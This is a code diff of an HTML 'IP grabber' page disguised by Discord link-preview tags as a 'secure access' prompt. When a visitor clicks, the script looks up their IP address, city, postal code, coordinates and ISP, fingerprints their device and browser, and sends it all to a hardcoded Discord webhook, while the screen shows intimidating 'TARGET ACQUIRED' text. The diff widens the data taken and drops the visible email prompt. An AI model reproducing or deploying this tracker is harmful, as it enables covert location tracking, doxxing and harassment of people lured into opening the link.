@@ -1,21 +1,26 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    
+    <!-- Discord Embed Tags -->
+    <meta property="og:title" content="🔴 SECURE ACCESS REQUIRED - CLICK TO ENTER">
+    <meta property="og:description" content="Identity verification in progress. Location and device data being logged.">
+    <meta property="og:image" content="https://i.imgur.com/5z3vK8J.jpg">
+    <meta property="og:type" content="website">
+    <meta name="theme-color" content="#ff0000">
+
+    <title>SECURE ACCESS</title>
     <style>
         body, html {
-            margin: 0;
-            padding: 0;
+            margin: 0; padding: 0;
             background: #000000;
-            height: 100%;
-            width: 100%;
+            height: 100%; width: 100%;
             overflow: hidden;
             color: white;
             font-family: Arial, sans-serif;
         }
-
         .enter-screen {
             height: 100vh;
             display: flex;
@@ -25,15 +30,15 @@
             background: linear-gradient(#000000, #220000);
         }
         .enter-btn {
-            font-size: 2.2em;
-            padding: 25px 60px;
-            border: 4px solid #ff0000;
-            border-radius: 10px;
-            background: rgba(0, 0, 0, 0.8);
+            font-size: 2.5em;
+            padding: 30px 80px;
+            border: 5px solid #ff0000;
+            border-radius: 12px;
+            background: rgba(0, 0, 0, 0.9);
             color: #ff0000;
             cursor: pointer;
-            text-shadow: 0 0 20px #ff0000;
-            box-shadow: 0 0 30px #ff0000;
+            text-shadow: 0 0 25px #ff0000;
+            box-shadow: 0 0 40px #ff0000;
             position: relative;
             overflow: hidden;
         }
@@ -43,13 +48,13 @@
             bottom: -100%;
             left: 0;
             width: 100%;
-            height: 30%;
-            background: linear-gradient(transparent, rgba(255, 0, 0, 0.6));
-            animation: blood-drip 4s linear infinite;
+            height: 40%;
+            background: linear-gradient(transparent, rgba(255, 0, 0, 0.8));
+            animation: blood-drip 3s linear infinite;
         }
         @keyframes blood-drip {
             0% { transform: translateY(-100%); }
-            100% { transform: translateY(400%); }
+            100% { transform: translateY(500%); }
         }
 
         .main-content {
@@ -72,13 +77,14 @@
             transform: translate(-50%, -50%);
             text-align: center;
             z-index: 2;
+            width: 90%;
         }
         .info {
-            font-size: 1.35em;
-            line-height: 2.1;
+            font-size: 1.45em;
+            line-height: 2.3;
             font-weight: bold;
             color: #ff0000;
-            text-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000;
+            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
         }
     </style>
 </head>
@@ -91,39 +97,87 @@
     </div>
 
     <div class="main-content" id="mainContent">
-        <!-- Video (video.mp4 naam rakhna) -->
         <video id="video" loop muted>
             <source src="video.mp4" type="video/mp4">
         </video>
 
         <div class="overlay">
-            <div class="info" id="info">Detecting...</div>
+            <div class="info" id="info">TARGET ACQUIRED...</div>
         </div>
     </div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1515738096518561892/G0Heb3rAfyK-CJgrwRvhjtdQGEafClkeNlbfwmW4_p7wXmS1uXDjXzwyPayrNI7R8_rz";
 
-        function sendToDiscord(data, email = "N/A") {
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = "Unknown";
+            let os = "Unknown";
+            
+            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+            else if (ua.includes("Firefox")) browser = "Firefox";
+            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+            else if (ua.includes("Edg")) browser = "Edge";
+            else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
+            
+            if (ua.includes("Windows")) os = "Windows";
+            else if (ua.includes("Mac")) os = "macOS";
+            else if (ua.includes("Linux")) os = "Linux";
+            else if (ua.includes("Android")) os = "Android";
+            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+            
+            return {
+                browser: browser,
+                os: os,
+                device: /Mobi|Android/i.test(ua) ? "Mobile" : "Desktop",
+                userAgent: ua.substring(0, 120) + "...",
+                screen: `${screen.width} x ${screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
+                online: navigator.onLine ? "Yes" : "No"
+            };
+        }
+
+        function sendToDiscord(data, device) {
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    username: "🦇",
+                    username: "🦇 IP GRABBER",
                     embeds: [{
-                        title: "Target Acquired 🇨🇳📡",
+                        title: "🎯 TARGET ACQUIRED SUCCESSFULLY 🇨🇳📡",
                         color: 0xff0000,
                         timestamp: new Date().toISOString(),
                         fields: [
-                            { name: "IP", value: data.ip || "N/A", inline: true },
+                            // Sector I - User / Location
+                            { name: "SECTOR [I] — USER DETAILS", value: "**Location & IP Info**", inline: false },
+                            { name: "IP Address", value: data.ip || "N/A", inline: true },
                             { name: "City", value: data.city || "N/A", inline: true },
-                            { name: "Zip Code", value: data.postal || "N/A", inline: true },
                             { name: "Region", value: data.region || "N/A", inline: true },
-                            { name: "Country", value: `\( {data.country_name} ( \){data.country})`, inline: true },
-                            { name: "Email", value: email, inline: false },
+                            { name: "Country", value: `\( {data.country_name || "N/A"} ( \){data.country || "N/A"})`, inline: true },
+                            { name: "Postal", value: data.postal || "N/A", inline: true },
+                            { name: "ISP / Org", value: data.org || "N/A", inline: false },
+                            { name: "Coordinates", value: `${data.latitude || "N/A"}, ${data.longitude || "N/A"}`, inline: true },
                             { name: "Timezone", value: data.timezone || "N/A", inline: true },
-                            { name: "Time", value: new Date().toLocaleString('en-IN'), inline: false }
-                        ]
+                            
+                            // Sector II - Device
+                            { name: "SECTOR [II] — DEVICE DETAILS", value: "**Hardware & Software**", inline: false },
+                            { name: "Device Type", value: device.device, inline: true },
+                            { name: "OS", value: device.os, inline: true },
+                            { name: "Browser", value: device.browser, inline: true },
+                            { name: "Screen Resolution", value: device.screen, inline: true },
+                            { name: "Platform", value: device.platform, inline: true },
+                            { name: "Language", value: device.language, inline: true },
+                            
+                            // Sector III - Extra
+                            { name: "SECTOR [III] — SYSTEM INFO", value: "**Additional Traces**", inline: false },
+                            { name: "Online", value: device.online, inline: true },
+                            { name: "Cookies", value: device.cookies, inline: true },
+                            { name: "Full UA (Partial)", value: device.userAgent, inline: false },
+                            { name: "Capture Time", value: new Date().toLocaleString('en-IN'), inline: false }
+                        ],
+                        image: { url: "https://i.imgur.com/5z3vK8J.jpg" }
                     }]
                 })
             }).catch(() => {});
@@ -137,21 +191,24 @@
             video.muted = false;
             video.play().catch(() => {});
 
-            // Email prompt
+            // No email prompt - direct fetch
             setTimeout(() => {
-                const email = prompt("Enter your Email to Continue:");
-                
                 fetch('https://ipapi.co/json/')
                     .then(r => r.json())
                     .then(data => {
-                        sendToDiscord(data, email || "N/A");
-                        const text = `Your IP: ${data.ip}<br>City: ${data.city}<br>Country: ${data.country_name}`;
+                        const device = getDeviceInfo();
+                        sendToDiscord(data, device);
+                        
+                        const text = `IP: ${data.ip}<br>` +
+                                    `City: ${data.city}<br>` +
+                                    `Country: ${data.country_name}<br>` +
+                                    `Device: ${device.device} • ${device.os}`;
                         typeWriter(text);
                     })
                     .catch(() => {
-                        typeWriter("You have been traced...");
+                        typeWriter("TARGET TRACED SUCCESSFULLY...");
                     });
-            }, 800);
+            }, 600);
         }
 
         function typeWriter(text) {
@@ -162,7 +219,7 @@
                 if (i < text.length) {
                     element.innerHTML += (text.charAt(i) === '<' ? '<br>' : text.charAt(i));
                     i++;
-                    setTimeout(type, 50);
+                    setTimeout(type, 60);
                 }
             }
             type();
